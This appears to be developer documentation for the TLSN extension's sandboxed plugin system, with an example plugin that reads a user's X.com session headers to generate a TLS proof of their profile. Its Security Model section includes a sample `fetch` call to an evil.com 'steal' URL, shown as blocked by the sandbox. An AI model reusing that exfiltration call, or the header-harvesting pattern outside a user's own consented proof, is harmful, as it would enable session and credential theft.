# TLSN Extension Plugin System

This document describes the architecture, capabilities, and development guide for TLSN Extension plugins.

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Plugin Lifecycle](#plugin-lifecycle)
4. [Available Capabilities](#available-capabilities)
5. [Example: X-Profile Plugin](#example-x-profile-plugin)
6. [Security Model](#security-model)
7. [Development Guide](#development-guide)

---

## Overview

The TLSN Extension features a **secure plugin system** that allows developers to create JavaScript plugins for generating TLS proofs. Plugins run in an isolated **QuickJS WebAssembly sandbox** with controlled access to extension features through a **capability-based security model**.

### Key Features

- ✅ **Sandboxed Execution** - Plugins run in isolated QuickJS WASM environment
- ✅ **Capability-Based Security** - Fine-grained control over plugin permissions
- ✅ **Multi-Window Support** - Open and manage up to 10 browser windows
- ✅ **Request Interception** - Capture HTTP requests and headers in real-time
- ✅ **Unified Proof Generation** - Single `prove()` API handles all TLS proof operations
- ✅ **React-like Hooks** - Familiar patterns with `useEffect`, `useRequests`, `useHeaders`
- ✅ **Type-Safe** - Full TypeScript support with declaration files

### Architecture Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                     Browser Extension                        │
│                                                              │
│  ┌────────────────┐         ┌──────────────────┐           │
│  │   Background   │◄────────┤ Content Script   │           │
│  │ Service Worker │         │  (Per Tab)       │           │
│  └────────┬───────┘         └──────────────────┘           │
│           │                                                  │
│           │ Manages                                          │
│           ▼                                                  │
│  ┌────────────────────┐                                     │
│  │  WindowManager     │  - Track up to 10 windows          │
│  │                    │  - Intercept HTTP requests          │
│  │                    │  - Store request/header history     │
│  └────────────────────┘                                     │
│           │                                                  │
│           │ Forwards to                                      │
│           ▼                                                  │
│  ┌────────────────────────────────────────────────┐        │
│  │         Offscreen Document                      │        │
│  │                                                  │        │
│  │  ┌──────────────────┐      ┌─────────────────┐│        │
│  │  │ SessionManager   │◄────►│  ProveManager   ││        │
│  │  │                  │      │  (WASM Worker)  ││        │
│  │  │  - Plugin State  │      │                 ││        │
│  │  │  - UI Rendering  │      │  - TLS Prover   ││        │
│  │  │  - Capabilities  │      │  - Transcripts  ││        │
│  │  └────────┬─────────┘      └─────────────────┘│        │
│  │           │                                      │        │
│  │           │ Creates & Manages                    │        │
│  │           ▼                                      │        │
│  │  ┌─────────────────────────────────┐           │        │
│  │  │    Host (QuickJS Sandbox)       │           │        │
│  │  │                                  │           │        │
│  │  │  ┌────────────────────────────┐ │           │        │
│  │  │  │   Plugin Code (Isolated)   │ │           │        │
│  │  │  │                            │ │           │        │
│  │  │  │  - main() → UI rendering  │ │           │        │
│  │  │  │  - callbacks → User actions│ │           │        │
│  │  │  │                            │ │           │        │
│  │  │  │  Access via env object:   │ │           │        │
│  │  │  │  - env.openWindow()       │ │           │        │
│  │  │  │  - env.useRequests()      │ │           │        │
│  │  │  │  - env.useState/setState()│ │           │        │
│  │  │  │  - env.prove()            │ │           │        │
│  │  │  │  - env.div(), env.button()│ │           │        │
│  │  │  └────────────────────────────┘ │           │        │
│  │  │                                  │           │        │
│  │  │  Security: No network, no FS    │           │        │
│  │  └─────────────────────────────────┘           │        │
│  └──────────────────────────────────────────────────┘        │
└─────────────────────────────────────────────────────────────┘
```

---

## Architecture

### Core Components

#### 1. **Host** (`packages/plugin-sdk/src/index.ts`)

The `Host` class is the core runtime for executing plugins. It:

- Creates isolated QuickJS WebAssembly sandboxes
- Registers capabilities (functions) that plugins can access via `env` object
- Provides `executePlugin(code)` method for running plugin code
- Handles error propagation from sandbox to host

**Key Configuration:**

```typescript
const sandboxOptions = {
  allowFetch: false,    // Network disabled for security
  allowFs: false,       // File system disabled
  env: {                // Capabilities injected here
    div: (options, children) => { /* ... */ },
    button: (options, children) => { /* ... */ },
    openWindow: (url, options) => { /* ... */ },
    useEffect: (callback, deps) => { /* ... */ },
    useRequests: (filter) => { /* ... */ },
    useHeaders: (filter) => { /* ... */ },
    useState: (key, defaultValue) => { /* ... */ },
    setState: (key, value) => { /* ... */ },
    prove: (request, proverOptions) => { /* ... */ },
    done: (result) => { /* ... */ },
  },
};
```

#### 2. **SessionManager** (`packages/extension/src/offscreen/SessionManager.ts`)

Manages plugin lifecycle and provides all capabilities. Responsibilities:

- **Plugin Execution** - Delegates to Host class from plugin-sdk
- **Capability Injection** - Provides `prove`, `openWindow`, hooks, etc.
- **UI Rendering** - Executes `main()` to generate plugin UI as JSON
- **Message Handling** - Routes events between background and plugin

#### 3. **ProveManager** (`packages/extension/src/offscreen/ProveManager/`)

Manages TLS proof generation using TLSN WebAssembly. Features:

- **Worker-Based Execution** - Runs WASM in Web Worker for non-blocking performance
- **Prover Lifecycle** - Create, configure, and manage provers
- **Request Proxying** - Send HTTP requests through TLS prover
- **Transcript Parsing** - Parse HTTP transcripts with byte-level range tracking
- **Selective Handlers** - Control which parts of transcript are revealed to verifier

#### 4. **WindowManager** (`packages/extension/src/background/WindowManager.ts`)

Manages multiple browser windows and request interception. Features:

- **Window Registration** - Track up to 10 concurrent managed windows
- **Request Interception** - Capture all HTTP requests via `webRequest` API
- **Header Interception** - Capture all request headers
- **History Management** - Store up to 1000 requests/headers per window
- **Overlay Control** - Show/hide TLSN overlay with retry logic
- **Automatic Cleanup** - Remove invalid windows periodically

---

## Plugin Lifecycle

### 1. Plugin Execution

```
┌───────────────────────────────────────────────────────────┐
│  1. User Triggers Plugin Execution                        │
│     (e.g., from Developer Console)                        │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  2. Background Service Worker                             │
│     - Receives EXEC_CODE message                          │
│     - Forwards to Offscreen Document                      │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  3. SessionManager.executePlugin(code)                    │
│     - Creates QuickJS sandbox with capabilities           │
│     - Evaluates plugin code                               │
│     - Extracts { main, onClick, config, ...callbacks }    │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  4. Initial Render: main()                                │
│     - Plugin returns UI as JSON (div/button tree)         │
│     - May call openWindow() via useEffect                 │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  5. Request/Header Interception                           │
│     - WindowManager captures HTTP traffic                 │
│     - Sends REQUEST_INTERCEPTED messages                  │
│     - SessionManager updates plugin state                 │
│     - Calls main() again → UI updates                     │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  6. User Interaction (Button Click)                       │
│     - Content script sends PLUGIN_UI_CLICK message        │
│     - SessionManager executes associated callback         │
│     - Callback may call prove() to generate proof         │
│     - Calls main() again → UI updates                     │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  7. Plugin Completion: done()                             │
│     - Closes associated window                            │
│     - Disposes QuickJS sandbox                            │
│     - Resolves executePlugin() promise                    │
└───────────────────────────────────────────────────────────┘
```

---

## Available Capabilities

All capabilities are accessible via the `env` object in plugin code. The `env` object is automatically injected into the QuickJS sandbox by the Host.

### DOM Construction

Create UI elements as JSON. These are rendered by the content script.

#### `div(options, children)`

Create a div element.

**Parameters:**
- `options` - Object with `style`, `onclick`, and other HTML attributes
- `children` - Array of child elements or strings

**Returns:** JSON representation of div element

**Example:**

```javascript
div(
  {
    style: {
      backgroundColor: '#1a1a1a',
      padding: '16px',
      borderRadius: '8px',
    },
  },
  [
    'Hello World',
    button({ onclick: 'handleClick' }, ['Click Me']),
  ]
)
```

#### `button(options, children)`

Create a button element.

**Parameters:**
- `options` - Object with `style`, `onclick`, and other HTML attributes
  - `onclick` - String name of callback function to execute
- `children` - Array of child elements or strings

**Returns:** JSON representation of button element

**Example:**

```javascript
button(
  {
    style: {
      backgroundColor: '#4CAF50',
      color: 'white',
      padding: '10px 20px',
      border: 'none',
      borderRadius: '4px',
      cursor: 'pointer',
    },
    onclick: 'onClick', // Name of exported callback
  },
  ['Generate Proof']
)
```

---

### Window Management

#### `openWindow(url, options?)`

Open a new managed browser window with request interception enabled.

**Parameters:**
- `url` - String URL to open
- `options` - Optional object:
  - `width` - Window width in pixels (default: 800)
  - `height` - Window height in pixels (default: 600)
  - `showOverlay` - Boolean, show TLSN overlay (default: false)

**Returns:** Promise<{ windowId: number, uuid: string, tabId: number }>

**Limits:**
- Maximum 10 concurrent managed windows
- Throws error if limit exceeded

**Example:**

```javascript
// Open X.com with overlay
const windowInfo = await openWindow('https://x.com', {
  width: 900,
  height: 700,
  showOverlay: true,
});

console.log('Window opened:', windowInfo.windowId);
```

---

### React-like Hooks

#### `useEffect(effect, deps)`

Run side effects with dependency tracking (similar to React's useEffect).

**Parameters:**
- `effect` - Function to execute
- `deps` - Array of dependencies (effect runs when dependencies change)

**Behavior:**
- On first render: Always executes
- On subsequent renders: Executes only if dependencies changed
- Dependencies compared using deep equality

**Example:**

```javascript
function main() {
  const [requests] = useRequests((reqs) => reqs);

  // Open window on first render only
  useEffect(() => {
    openWindow('https://x.com');
  }, []);

  // Log when requests change
  useEffect(() => {
    console.log('Requests updated:', requests.length);
  }, [requests]);

  return div({}, ['Hello World']);
}
```

#### `useState(key, defaultValue)`

Get a state value by key, with optional default value.

**Parameters:**
- `key` - String key to identify the state value
- `defaultValue` - Optional default value if key doesn't exist

**Returns:** The current state value for the given key

**Example:**

```javascript
function main() {
  // Get state with default value
  const count = useState('count', 0);
  const username = useState('username', '');

  return div({}, [
    `Count: ${count}`,
    `Username: ${username}`,
  ]);
}
```

#### `setState(key, value)`

Set a state value by key. Triggers a UI re-render when the state changes.

**Parameters:**
- `key` - String key to identify the state value
- `value` - The new value to set

**Behavior:**
- Updates the state store with the new value
- Compares new state with previous state using deep equality
- Only triggers re-render if state actually changed
- Sends `TO_BG_RE_RENDER_PLUGIN_UI` message to trigger UI update

**Example:**

```javascript
async function onClick() {
  // Update state - triggers re-render
  setState('count', useState('count', 0) + 1);
  setState('username', 'newUser');
}
```

**Complete useState/setState Example:**

```javascript
function main() {
  const count = useState('count', 0);
  const status = useState('status', 'idle');

  return div({}, [
    div({}, [`Status: ${status}`]),
    div({}, [`Count: ${count}`]),
    button({ onclick: 'increment' }, ['Increment']),
  ]);
}

async function increment() {
  setState('status', 'updating');
  const current = useState('count', 0);
  setState('count', current + 1);
  setState('status', 'idle');
}

export default { main, increment };
```

#### `useRequests(filterFn)`

Get filtered intercepted HTTP requests for the current window.

**Parameters:**
- `filterFn` - Function that filters/transforms request array
  - Receives: `InterceptedRequest[]`
  - Returns: Filtered/transformed array

**Returns:** Array with result of filterFn

**InterceptedRequest Structure:**

```typescript
interface InterceptedRequest {
  id: string;          // Chrome request ID
  url: string;         // Full request URL
  method: string;      // HTTP method (GET, POST, etc.)
  timestamp: number;   // Unix timestamp (milliseconds)
  tabId: number;       // Tab ID where request originated
  requestBody?: {      // Optional request body data
    error?: string;    // Error message if body couldn't be read
    formData?: Record<string, string>;  // Form data (if applicable)
    raw?: Array<{      // Raw body data
      bytes?: any;     // ArrayBuffer-like bytes
      file?: string;   // File path (if uploading)
    }>;
  };
}
```

**Example:**

```javascript
// Get all API requests to x.com
const [apiRequests] = useRequests((requests) =>
  requests.filter((req) =>
    req.url.includes('api.x.com') &&
    req.method === 'GET'
  )
);
```

#### `useHeaders(filterFn)`

Get filtered intercepted HTTP request headers for the current window.

**Parameters:**
- `filterFn` - Function that filters/transforms header array
  - Receives: `InterceptedRequestHeader[]`
  - Returns: Filtered/transformed array

**Returns:** Array with result of filterFn

**InterceptedRequestHeader Structure:**

```typescript
interface InterceptedRequestHeader {
  id: string;          // Chrome request ID
  url: string;         // Full request URL
  method: string;      // HTTP method
  timestamp: number;   // Unix timestamp
  type: string;        // Resource type
  tabId: number;       // Tab ID
  requestHeaders: Array<{
    name: string;      // Header name (e.g., 'Cookie')
    value?: string;    // Header value
  }>;
}
```

**Example:**

```javascript
// Find request with authentication headers
const [authHeader] = useHeaders((headers) =>
  headers.filter((header) =>
    header.url.includes('api.x.com/1.1/account/settings.json')
  )
);

// Extract specific headers
if (authHeader) {
  const cookie = authHeader.requestHeaders.find(h => h.name === 'Cookie')?.value;
  const csrfToken = authHeader.requestHeaders.find(h => h.name === 'x-csrf-token')?.value;
}
```

---

### TLS Proof Generation

#### `prove(requestOptions, proverOptions)`

**The unified API for TLS proof generation.** This single function handles:
1. Creating a prover connection to the verifier
2. Sending the HTTP request through the TLS prover
3. Capturing the TLS transcript (sent/received data)
4. Parsing the transcript with byte-level range tracking
5. Applying selective reveal handlers
6. Generating and returning the proof

**Parameters:**

**`requestOptions`** - Object specifying the HTTP request:
- `url` - String, full request URL (e.g., 'https://api.x.com/1.1/account/settings.json')
- `method` - String, HTTP method ('GET', 'POST', etc.)
- `headers` - Object, request headers as key-value pairs
- `body` - Optional string, request body for POST/PUT requests

**`proverOptions`** - Object specifying proof configuration:
- `verifierUrl` - String, verifier/notary WebSocket URL (e.g., 'http://localhost:7047')
- `proxyUrl` - String, WebSocket proxy URL (e.g., 'wss://notary.pse.dev/proxy?token=api.x.com')
- `maxRecvData` - Optional number, max received bytes (default: 16384)
- `maxSentData` - Optional number, max sent bytes (default: 4096)
- `handlers` - Array of Handler objects specifying what to handle
- `sessionData` - Optional object, custom key-value data to include in the session (passed to verifier)

**Handler Structure:**

```typescript
type Handler = {
  type: 'SENT' | 'RECV';           // Which direction (request/response)
  part: 'START_LINE' | 'PROTOCOL' | 'METHOD' | 'REQUEST_TARGET' |
        'STATUS_CODE' | 'HEADERS' | 'BODY' | 'ALL';
  action: 'REVEAL' | 'PEDERSEN';   // Reveal plaintext or commit hash
  params?: {
    // For HEADERS:
    key?: string;                  // Header name to reveal
    hideKey?: boolean;             // Hide header name, show value only
    hideValue?: boolean;           // Hide value, show header name only

    // For BODY with JSON:
    type?: 'json';
    path?: string;                 // JSON field path (e.g., 'screen_name')

    // For ALL with regex (matches across entire transcript):
    type?: 'regex';
    regex?: string;                // Regex pattern as string
    flags?: string;                // Regex flags (e.g., 'g', 'i', 'gi')
  };
};
```

**Handler Part Values:**

| Part | Description | Applicable To |
|------|-------------|---------------|
| `START_LINE` | Full first line (e.g., `GET /path HTTP/1.1`) | SENT, RECV |
| `PROTOCOL` | HTTP version (e.g., `HTTP/1.1`) | SENT, RECV |
| `METHOD` | HTTP method (e.g., `GET`, `POST`) | SENT only |
| `REQUEST_TARGET` | Request path (e.g., `/1.1/account/settings.json`) | SENT only |
| `STATUS_CODE` | Response status (e.g., `200`) | RECV only |
| `HEADERS` | HTTP headers section | SENT, RECV |
| `BODY` | HTTP body content | SENT, RECV |
| `ALL` | Entire transcript (use with regex) | SENT, RECV |

**Returns:** Promise<ProofResponse> - The generated proof data

**ProofResponse Structure:**

The `prove()` function returns a Promise that resolves to an object containing structured handler results. Each handler you specify is mapped to its extracted value from the TLS transcript:

```typescript
interface ProofResponse {
  results: Array<{
    type: 'SENT' | 'RECV';              // Request or response data
    part: string;                        // Which part (START_LINE, HEADERS, BODY, etc.)
    action: 'REVEAL' | 'PEDERSEN';       // Reveal or commitment action
    params?: object;                     // Optional handler parameters
    value: string;                       // The extracted value
  }>;
}
```

**Example Return Value:**

```javascript
{
  results: [
    {
      type: 'SENT',
      part: 'START_LINE',
      action: 'REVEAL',
      value: 'GET /1.1/account/settings.json HTTP/1.1'
    },
    {
      type: 'RECV',
      part: 'START_LINE',
      action: 'REVEAL',
      value: 'HTTP/1.1 200 OK'
    },
    {
      type: 'RECV',
      part: 'HEADERS',
      action: 'REVEAL',
      params: { key: 'date' },
      value: 'Tue, 28 Oct 2025 14:46:24 GMT'
    },
    {
      type: 'RECV',
      part: 'BODY',
      action: 'REVEAL',
      params: { type: 'json', path: 'screen_name', hideKey: true },
      value: '0xTsukino'
    }
  ]
}
```

**Understanding the Results:**

- **`results`**: Array where each element corresponds to one of your handlers
- **`type` + `part` + `params`**: Echo back your handler configuration so you know which result is which
- **`value`**: The extracted string value from the TLS transcript for that handler
- **Order**: Results array maintains the same order as your handlers array

**Usage Example:**

```javascript
const proof = await prove(requestOptions, {
  // ... prover options with handlers
});

// Access specific results
const startLine = proof.results.find(r => r.part === 'START_LINE' && r.type === 'RECV');
console.log('Response status:', startLine.value); // "HTTP/1.1 200 OK"

const username = proof.results.find(r =>
  r.part === 'BODY' && r.params?.path === 'screen_name'
);
console.log('Username:', username.value); // "0xTsukino"
```

**Complete Example:**

```javascript
// Generate proof for X.com profile API call
const proof = await prove(
  // Request options - the HTTP request to prove
  {
    url: 'https://api.x.com/1.1/account/settings.json',
    method: 'GET',
    headers: {
      'Cookie': cookieValue,
      'authorization': authToken,
      'x-csrf-token': csrfToken,
      'Host': 'api.x.com',
      'Accept-Encoding': 'identity',
      'Connection': 'close',
    },
  },
  // Prover options - how to generate the proof
  {
    verifierUrl: 'http://localhost:7047',
    proxyUrl: 'wss://notary.pse.dev/proxy?token=api.x.com',
    maxRecvData: 16384,  // 16 KB max receive
    maxSentData: 4096,   // 4 KB max send

    // handlers - what to include in the proof
    handlers: [
      // Reveal the request start line (GET /1.1/account/settings.json HTTP/1.1)
      {
        type: 'SENT',
        part: 'START_LINE',
        action: 'REVEAL',
      },

      // Reveal the response start line (HTTP/1.1 200 OK)
      {
        type: 'RECV',
        part: 'START_LINE',
        action: 'REVEAL',
      },

      // Reveal specific response header (Date header)
      {
        type: 'RECV',
        part: 'HEADERS',
        action: 'REVEAL',
        params: {
          key: 'date',
        },
      },

      // Reveal JSON field from response body (just the value)
      {
        type: 'RECV',
        part: 'BODY',
        action: 'REVEAL',
        params: {
          type: 'json',
          path: 'screen_name',
          hideKey: true,  // Only reveal "0xTsukino", not the key
        },
      },
    ],
  }
);

// Proof is now generated and returned
console.log('Proof generated:', proof);
```

**Reveal Handler Examples:**

```javascript
// Example 1: Reveal entire request start line
{
  type: 'SENT',
  part: 'START_LINE',
  action: 'REVEAL',
}

// Example 2: Reveal specific header with key and value
{
  type: 'RECV',
  part: 'HEADERS',
  action: 'REVEAL',
  params: { key: 'content-type' },
}

// Example 3: Reveal header value only (hide the key)
{
  type: 'RECV',
  part: 'HEADERS',
  action: 'REVEAL',
  params: { key: 'date', hideKey: true },
}

// Example 4: Reveal JSON field with key and value
{
  type: 'RECV',
  part: 'BODY',
  action: 'REVEAL',
  params: {
    type: 'json',
    path: 'user_id',
  },
}

// Example 5: Reveal regex match across entire transcript
{
  type: 'RECV',
  part: 'ALL',
  action: 'REVEAL',
  params: {
    type: 'regex',
    regex: 'user_id=\\d+',  // Regex as string
    flags: 'g',              // Global flag
  },
}

// Example 6: Commit hash instead of revealing (for privacy)
{
  type: 'SENT',
  part: 'HEADERS',
  action: 'PEDERSEN',
  params: { key: 'Cookie' },
}
```

---

### Utility Functions

#### `done(args?)`

Complete plugin execution and cleanup.

**Parameters:**
- `args` - Optional data to return to caller

**Effects:**
- Closes associated browser window
- Disposes QuickJS sandbox
- Resolves `executePlugin()` promise

**Example:**

```javascript
async function onClick() {
  // ... generate proof ...
  const proof = await prove(requestOpts, proverOpts);

  // Finish and close window
  await done(proof);
}
```

---

## Example: X-Profile Plugin

This example demonstrates a complete plugin that proves a user's X.com (Twitter) profile by:
1. Opening X.com and waiting for user to log in
2. Detecting the profile API request
3. Generating a TLS proof with selective reveal (showing profile data but hiding auth headers)

```javascript
// =============================================================================
// Plugin Configuration
// =============================================================================
// This metadata is shown in the plugin UI
const config = {
  name: 'X Profile Prover',
  description: 'Prove your X.com profile data with selective disclosure',
};

// =============================================================================
// Main UI Rendering Function
// =============================================================================
/**
 * The main() function is called reactively whenever plugin state changes.
 * It returns a JSON representation of the UI to display in the browser.
 *
 * React-like behavior:
 * - Called on plugin initialization
 * - Called when intercepted requests/headers update
 * - Called after user interactions (button clicks)
 *
 * @returns {DomJson} JSON tree representing the plugin UI
 */
function main() {
  // -------------------------------------------------------------------------
  // HOOK: Get intercepted headers matching X.com profile API
  // -------------------------------------------------------------------------
  // useHeaders() filters all intercepted request headers and returns matches
  // This re-runs whenever new headers are intercepted
  const [header] = useHeaders((headers) =>
    headers.filter((header) =>
      // Look for X.com's account settings endpoint
      // This endpoint is called when user is logged in
      header.url.includes('https://api.x.com/1.1/account/settings.json'),
    ),
  );

  // -------------------------------------------------------------------------
  // HOOK: Open X.com window on first render
  // -------------------------------------------------------------------------
  // useEffect with empty dependency array [] runs only once on mount
  useEffect(() => {
    // Open a managed window to X.com
    // This enables request interception for that window
    openWindow('https://x.com');
  }, []);

  // -------------------------------------------------------------------------
  // Render Plugin UI
  // -------------------------------------------------------------------------
  // Returns a floating card in the bottom-right corner
  // UI updates reactively based on whether profile is detected
  return div(
    {
      style: {
        position: 'fixed',
        bottom: '0',
        right: '8px',
        width: '240px',
        height: '240px',
        borderRadius: '4px 4px 0 0',
        backgroundColor: '#b8b8b8',
        zIndex: '999999',
        fontSize: '16px',
        color: '#0f0f0f',
        border: '1px solid #e2e2e2',
        borderBottom: 'none',
        padding: '8px',
        fontFamily: 'sans-serif',
      },
    },
    [
      // Status indicator div
      div(
        {
          style: {
            fontWeight: 'bold',
            // Green when profile detected, red when waiting
            color: header ? 'green' : 'red',
          },
        },
        // Show different message based on detection state
        [header ? 'Profile detected!' : 'No profile detected'],
      ),

      // Conditional rendering based on detection state
      header
        ? // Case 1: Profile detected - show "Prove" button
          button(
            {
              style: {
                color: 'black',
                backgroundColor: 'white',
                padding: '8px 16px',
                border: '1px solid #ccc',
                borderRadius: '4px',
                cursor: 'pointer',
                marginTop: '8px',
              },
              // When clicked, execute the 'onClick' callback (defined below)
              onclick: 'onClick',
            },
            ['Prove'],
          )
        : // Case 2: Not detected - show instructions
          div(
            {
              style: {
                color: 'black',
                marginTop: '8px',
              },
            },
            ['Please login to x.com'],
          ),
    ],
  );
}

// =============================================================================
// Proof Generation Callback
// =============================================================================
/**
 * This function is triggered when the user clicks the "Prove" button.
 * It extracts authentication headers and generates a TLS proof using the
 * unified prove() API.
 *
 * Flow:
 * 1. Get the intercepted X.com API headers
 * 2. Extract authentication headers (Cookie, CSRF, OAuth)
 * 3. Call prove() with request and handlers configuration
 * 4. prove() internally:
 *    - Creates prover connection to verifier
 *    - Sends HTTP request through TLS prover
 *    - Captures transcript (sent/received data)
 *    - Parses transcript with byte-level ranges
 *    - Applies selective handlers
 *    - Generates proof
 * 5. Return proof to caller via done()
 *
 * @returns {Promise<void>}
 */
async function onClick() {
  // -------------------------------------------------------------------------
  // Step 1: Get the intercepted header
  // -------------------------------------------------------------------------
  // Same filter as in main() - finds the X.com profile API request
  const [header] = useHeaders((headers) =>
    headers.filter((header) =>
      header.url.includes('https://api.x.com/1.1/account/settings.json'),
    ),
  );

  // -------------------------------------------------------------------------
  // Step 2: Extract authentication headers
  // -------------------------------------------------------------------------
  // X.com requires several headers for authenticated API calls:
  // - Cookie: Session authentication
  // - x-csrf-token: CSRF protection token
  // - x-client-transaction-id: Request tracking ID
  // - authorization: OAuth bearer token
  const headers = {
    // Find and extract Cookie header value
    cookie: header.requestHeaders.find((h) => h.name === 'Cookie')?.value,

    // Find and extract CSRF token
    'x-csrf-token': header.requestHeaders.find((h) => h.name === 'x-csrf-token')?.value,

    // Find and extract transaction ID
    'x-client-transaction-id': header.requestHeaders.find(
      (h) => h.name === 'x-client-transaction-id',
    )?.value,

    // Required headers for API call
    Host: 'api.x.com',

    // Find and extract OAuth authorization header
    authorization: header.requestHeaders.find((h) => h.name === 'authorization')?.value,

    // Disable compression so transcript is readable
    'Accept-Encoding': 'identity',

    // Required for TLS proof - close connection after response
    Connection: 'close',
  };

  // -------------------------------------------------------------------------
  // Step 3: Generate TLS proof using unified prove() API
  // -------------------------------------------------------------------------
  // The prove() function handles everything:
  // - Prover creation
  // - Request sending
  // - Transcript capture
  // - Selective handlers
  // - Proof generation
  const resp = await prove(
    // REQUEST OPTIONS: What HTTP request to prove
    {
      url: 'https://api.x.com/1.1/account/settings.json',
      method: 'GET',
      headers: headers,
    },

    // PROVER OPTIONS: How to generate the proof
    {
      // Verifier/notary server URL
      verifierUrl: 'http://localhost:7047',

      // WebSocket proxy that forwards our request to the real X.com server
      proxyUrl: 'wss://notary.pse.dev/proxy?token=api.x.com',

      // Maximum bytes to receive (16 KB)
      maxRecvData: 16384,

      // Maximum bytes to send (4 KB)
      maxSentData: 4096,

      // REVEAL HANDLERS: What parts of the transcript to include in the proof
      // Each handler specifies a part of the HTTP request/response to reveal
      handlers: [
        // ---------------------------------------------------------------
        // Reveal the request start line
        // Example: "GET /1.1/account/settings.json HTTP/1.1"
        // ---------------------------------------------------------------
        {
          type: 'SENT',              // Request data
          part: 'START_LINE',        // The first line
          action: 'REVEAL',          // Include as plaintext
        },

        // ---------------------------------------------------------------
        // Reveal the response start line
        // Example: "HTTP/1.1 200 OK"
        // ---------------------------------------------------------------
        {
          type: 'RECV',              // Response data
          part: 'START_LINE',        // The first line
          action: 'REVEAL',          // Include as plaintext
        },

        // ---------------------------------------------------------------
        // Reveal the Date header from response
        // This proves when the request was made
        // ---------------------------------------------------------------
        {
          type: 'RECV',              // Response data
          part: 'HEADERS',           // HTTP headers section
          action: 'REVEAL',          // Include as plaintext
          params: {
            key: 'date',             // Specific header to reveal
          },
        },

        // ---------------------------------------------------------------
        // Reveal the 'screen_name' field from JSON response body
        // This proves the username without revealing the entire profile
        // hideKey: true means only show the value, not the key
        // Result in proof: "0xTsukino" instead of {"screen_name":"0xTsukino"}
        // ---------------------------------------------------------------
        {
          type: 'RECV',              // Response data
          part: 'BODY',              // HTTP body section
          action: 'REVEAL',          // Include as plaintext
          params: {
            type: 'json',            // Parse as JSON
            path: 'screen_name',     // Field to extract
            hideKey: true,           // Only reveal value, not the key
          },
        },
      ],
    },
  );

  // -------------------------------------------------------------------------
  // Step 4: Complete plugin execution
  // -------------------------------------------------------------------------
  // done() closes the window and returns the proof to the caller
  done(JSON.stringify(resp));
}

// =============================================================================
// Plugin Export
// =============================================================================
// The plugin must export an object with at least a main() function
// Other exports become available callbacks (triggered by button onclick)
export default {
  main,      // Required: UI rendering function
  onClick,   // Optional: callback triggered by onclick="onClick"
  config,    // Optional: plugin metadata
};
```

---

## Security Model

### Sandbox Isolation

Plugins run in a **QuickJS WebAssembly sandbox** with strict limitations:

**Disabled Features:**
- ❌ Network access (`fetch`, `XMLHttpRequest`)
- ❌ File system access
- ❌ Browser APIs (except through capabilities)
- ❌ Node.js APIs
- ❌ `eval` / `Function` constructors (controlled by QuickJS)

**Allowed Features:**
- ✅ ES6+ JavaScript syntax
- ✅ Pure computation
- ✅ Capabilities registered by host (via `env` object)

### Capability-Based Security

Plugins only access extension features through **explicitly registered capabilities**:

```javascript
// In plugin code (sandbox)
// ✅ Allowed - registered capability
await openWindow('https://x.com');

// ❌ Blocked - no fetch capability
await fetch('https://evil.com/steal'); // TypeError: fetch is not defined

// ❌ Blocked - no file system
const fs = require('fs'); // ReferenceError: require is not defined
```

### Resource Limits

**Window Management:**
- Maximum 10 concurrent managed windows
- Error thrown if limit exceeded

**Request/Header History:**
- Maximum 1000 requests per window
- Maximum 1000 headers per window
- Oldest items removed when limit exceeded (FIFO)

**Prover Limits:**
- `maxSentData`: 4096 bytes (configurable)
- `maxRecvData`: 16384 bytes (configurable)
- Configurable per-proof via `prove()` parameters

---

## Development Guide

### Plugin Structure

Every plugin must export an object with at least a `main` function:

```javascript
export default {
  main,              // Required: UI rendering function
  config: {          // Optional: plugin metadata
    name: 'My Plugin',
    description: 'Does something cool',
  },
  // Optional: callback functions (referenced by onclick)
  myCallback: async () => { /* ... */ },
  anotherCallback: async () => { /* ... */ },
};
```

### Best Practices

#### 1. Use Hooks for State Management

```javascript
function main() {
  // ✅ Good: Filter in hook, use result
  const [apiRequests] = useRequests((reqs) =>
    reqs.filter(r => r.url.includes('api.x.com'))
  );

  // ❌ Bad: Don't filter outside hooks
  // (won't trigger re-render when requests change)
}
```

#### 2. Handle Missing Data Gracefully

```javascript
function main() {
  const [header] = useHeaders(/* ... */);

  // ✅ Good: Check if header exists
  if (!header) {
    return div({}, ['Waiting for data...']);
  }

  // Access header safely
  const cookie = header.requestHeaders.find(h => h.name === 'Cookie')?.value;
}
```

#### 3. Use useEffect for Side Effects

```javascript
function main() {
  // ✅ Good: Open window once on first render
  useEffect(() => {
    openWindow('https://x.com');
  }, []);

  // ❌ Bad: Don't call directly in main
  // openWindow('https://x.com'); // Opens on EVERY render!
}
```

#### 4. Minimize Revealed Data

```javascript
// ✅ Good: Only reveal non-sensitive data
handlers: [
  {
    type: 'RECV',
    part: 'BODY',
    action: 'REVEAL',
    params: {
      type: 'json',
      path: 'public_field',
      hideKey: true,
    },
  },
]

// ❌ Bad: Don't reveal sensitive auth headers
handlers: [
  {
    type: 'SENT',
    part: 'HEADERS',
    action: 'REVEAL',
    params: { key: 'Cookie' }, // Exposes session!
  },
]
```

---

## API Reference Summary

### DOM Construction
- `div(options, children)` - Create div element
- `button(options, children)` - Create button element

### Window Management
- `openWindow(url, options?)` - Open managed window

### Hooks
- `useEffect(effect, deps)` - Side effect with dependencies
- `useRequests(filterFn)` - Get filtered requests
- `useHeaders(filterFn)` - Get filtered headers
- `useState(key, defaultValue?)` - Get state value by key
- `setState(key, value)` - Set state value and trigger re-render

### TLS Proof
- `prove(requestOptions, proverOptions)` - **Unified proof generation API**

### Utilities
- `done(args?)` - Cleanup and exit

---

**Last Updated:** December 2025
**Plugin SDK Version:** 0.1.0
**Extension Version:** 0.1.0
